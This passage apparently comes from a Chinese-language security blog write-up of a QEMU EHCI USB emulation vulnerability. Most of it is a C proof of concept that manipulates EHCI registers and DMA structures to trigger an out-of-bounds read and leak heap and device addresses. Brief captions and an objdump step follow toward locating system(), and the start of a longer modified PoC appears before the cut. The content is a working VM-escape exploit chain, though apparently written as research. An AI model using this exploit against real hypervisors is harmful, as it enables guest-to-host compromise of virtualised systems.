class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> * <span class="hljs-title">qh</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> * <span class="hljs-title">qtd</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ohci_td</span> * <span class="hljs-title">td</span>;</span><br><span class="hljs-type">char</span> *dmabuf;<br><span class="hljs-type">char</span> *setup_buf;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *mmio_mem;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data_buf;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data_buf_oob;<br><span class="hljs-type">uint32_t</span> *entry;<br><span class="hljs-type">uint64_t</span> dev_addr;<br><span class="hljs-type">uint64_t</span> data_buf_addr;<br><span class="hljs-type">uint64_t</span> USBPort_addr; <br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PRESET       (1 &lt;&lt; 8)     <span class="hljs-comment">// Port Reset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PED          (1 &lt;&lt; 2)     <span class="hljs-comment">// Port Enable/Disable</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_RUNSTOP      (1 &lt;&lt; 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_PSE          (1 &lt;&lt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_OUT         0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_IN          0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_ACTIVE    (1 &lt;&lt; 7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_SETUP     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_IN        1 <span class="hljs-comment">/* device -&gt; host */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_OUT       0 <span class="hljs-comment">/* host -&gt; device */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_TBYTES_SH 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_PID_SH    8</span><br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">virt2phys</span><span class="hljs-params">(<span class="hljs-type">void</span>* p)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> virt = (<span class="hljs-type">uint64_t</span>)p;<br><br>    <span class="hljs-comment">// Assert page alignment</span><br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>        die(<span class="hljs-string">&quot;open&quot;</span>);<br>    <span class="hljs-type">uint64_t</span> offset = (virt / <span class="hljs-number">0x1000</span>) * <span class="hljs-number">8</span>;<br>    lseek(fd, offset, SEEK_SET);<br><br>    <span class="hljs-type">uint64_t</span> phys;<br>    <span class="hljs-keyword">if</span> (read(fd, &amp;phys, <span class="hljs-number">8</span> ) != <span class="hljs-number">8</span>)<br>        die(<span class="hljs-string">&quot;read&quot;</span>);<br>    <span class="hljs-comment">// Assert page present</span><br><br>    phys = (phys &amp; ((<span class="hljs-number">1ULL</span> &lt;&lt; <span class="hljs-number">54</span>) - <span class="hljs-number">1</span>)) * <span class="hljs-number">0x1000</span>+(virt&amp;<span class="hljs-number">0xfff</span>);<br><br>    close(fd);<br>    <span class="hljs-keyword">return</span> phys;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)</span><br>&#123;<br>    perror(msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span>*)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:1d.7/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    <span class="hljs-keyword">if</span> (mmio_fd == <span class="hljs-number">-1</span>)<br>        die(<span class="hljs-string">&quot;mmio_fd open failed&quot;</span>);<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>        die(<span class="hljs-string">&quot;mmap mmio_mem failed&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmio_mem: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)mmio_mem);<br>    <br><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; ++i)<br>    &#123;<br>        dmabuf = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (dmabuf == MAP_FAILED)<br>            die(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        *(<span class="hljs-type">char</span> *)dmabuf = <span class="hljs-string">&#x27;a&#x27;</span>;<br>        *(<span class="hljs-type">char</span> *)(dmabuf + <span class="hljs-number">0x1000</span>) = <span class="hljs-string">&#x27;b&#x27;</span>;<br>        *(<span class="hljs-type">char</span> *)(dmabuf + <span class="hljs-number">0x2000</span>) = <span class="hljs-string">&#x27;c&#x27;</span>;<br>    <br>        entry = dmabuf + <span class="hljs-number">4</span>;<br>        qh = dmabuf + <span class="hljs-number">0x100</span>;<br>        qtd = dmabuf + <span class="hljs-number">0x200</span>;<br>        setup_buf = dmabuf + <span class="hljs-number">0x300</span>;<br>        data_buf = dmabuf + <span class="hljs-number">0x1000</span>;<br>        data_buf_oob = dmabuf + <span class="hljs-number">0x2000</span>;<br><br>        <span class="hljs-comment">// printf(&quot;phy_data_buf: 0x%lx\t phy_data_buf_oob: 0x%lx\n&quot;, virt2phys(data_buf), virt2phys(data_buf_oob));</span><br><br>        <span class="hljs-keyword">if</span>(virt2phys(data_buf) + <span class="hljs-number">0x1000</span> == virt2phys(data_buf_oob))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dmabuf: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)dmabuf);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_dmabuf: 0x%lx\n&quot;</span>, virt2phys(dmabuf));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)data_buf);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_data_buf: 0x%lx\n&quot;</span>, virt2phys(data_buf));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf_oob: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)data_buf_oob);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_data_buf_oob: 0x%lx\n&quot;</span>, virt2phys(data_buf_oob));<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(i == <span class="hljs-number">0x1000</span>)<br>    &#123;<br>        die(<span class="hljs-string">&quot;Unable to find a contiguous physical address!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;init Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reset_enable_port</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_EHCIState</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x2C</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// frindex</span><br>    mmio_write(<span class="hljs-number">0x34</span>, virt2phys(dmabuf));    <span class="hljs-comment">// periodiclistbase</span><br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);      <span class="hljs-comment">// usbcmd</span><br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_qh</span><span class="hljs-params">()</span>&#123;<br>    qh-&gt;epchar = <span class="hljs-number">0x00</span>;<br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = virt2phys(qtd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_state</span><span class="hljs-params">()</span>&#123;<br>    reset_enable_port();<br>    set_qh();<br><br>    setup_buf[<span class="hljs-number">6</span>] = <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = <span class="hljs-number">0x0</span>;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(setup_buf);<br><br>    *entry = virt2phys(qh)+<span class="hljs-number">0x2</span>;<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;init_state Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_length</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> len,<span class="hljs-type">uint8_t</span> option)</span>&#123;<br><br>    reset_enable_port();<br><br>    set_qh();<br><br>    setup_buf[<span class="hljs-number">0</span>] = option;<br>    setup_buf[<span class="hljs-number">6</span>] = len &amp; <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = (len &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(setup_buf);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set_length Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_state_data</span><span class="hljs-params">()</span><br>&#123;<br>    set_length(<span class="hljs-number">0x500</span>, USB_DIR_OUT);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span><br>&#123;<br>    getchar();<br>    getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    init();<br><br>    iopl(<span class="hljs-number">3</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc080</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc0a0</span>);<br>    outw(<span class="hljs-number">0</span>,<span class="hljs-number">0xc0c0</span>);<br>    sleep(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// debug();</span><br><br>    init_state();<br>    set_length(<span class="hljs-number">0x200</span>, USB_DIR_IN);  <span class="hljs-comment">// s-&gt;setup_state = SETUP_STATE_DATA;</span><br>    set_length(<span class="hljs-number">0x2000</span>, USB_DIR_IN);<br>    do_copy_read(); <span class="hljs-comment">// oob read</span><br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf[%d]: %lx\n&quot;</span>, i, *(<span class="hljs-type">uint64_t</span> *)(data_buf + i * <span class="hljs-number">8</span>));<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------------------------\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf_oob[%d]: %lx\n&quot;</span>, i, *(<span class="hljs-type">uint64_t</span> *)(data_buf_oob + i * <span class="hljs-number">8</span>));<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span>* <span class="hljs-title">usb_device_tmp</span> =</span> data_buf_oob + <span class="hljs-number">0x4</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> <span class="hljs-title">usb_device</span>;</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;usb_device, usb_device_tmp, <span class="hljs-keyword">sizeof</span>(USBDevice));<br><br>    dev_addr = usb_device.ep_ctl.dev;<br>    data_buf_addr = dev_addr + <span class="hljs-number">0xdc</span>;<br>    USBPort_addr = dev_addr + <span class="hljs-number">0x78</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBDevice dev_addr: 0x%llx\n&quot;</span>, dev_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBDevice-&gt;data_buf: 0x%llx\n&quot;</span>, data_buf_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USBPort_addr: 0x%llx\n&quot;</span>, USBPort_addr);<br><br>    <span class="hljs-type">uint64_t</span> *tmp=data_buf_oob+<span class="hljs-number">0x4fc</span>;   <span class="hljs-comment">// desc_device_high</span><br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> leak_addr = *tmp;<br>    <span class="hljs-keyword">if</span>(leak_addr == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INIT DOWN,DO IT AGAIN\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Raw Leaked Address: 0x%llx\n&quot;</span>, leak_addr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215153353142.png" srcset="/img/loading.gif" lazyload alt="image-20251215153353142"></p>
<p>获取程序地址：</p>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215153505421.png" srcset="/img/loading.gif" lazyload alt="image-20251215153505421"></p>
<p>计算偏移</p>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215153743804.png" srcset="/img/loading.gif" lazyload alt="image-20251215153743804"></p>
<p>计算system的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">objdump -d -j .plt.sec /opt/qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 | grep &quot;system&quot;<br></code></pre></td></tr></table></figure>
<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251215112054219.png" srcset="/img/loading.gif" lazyload alt="image-20251215112054219"></p>
<p>修改poc后执行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span>  </span><br><span 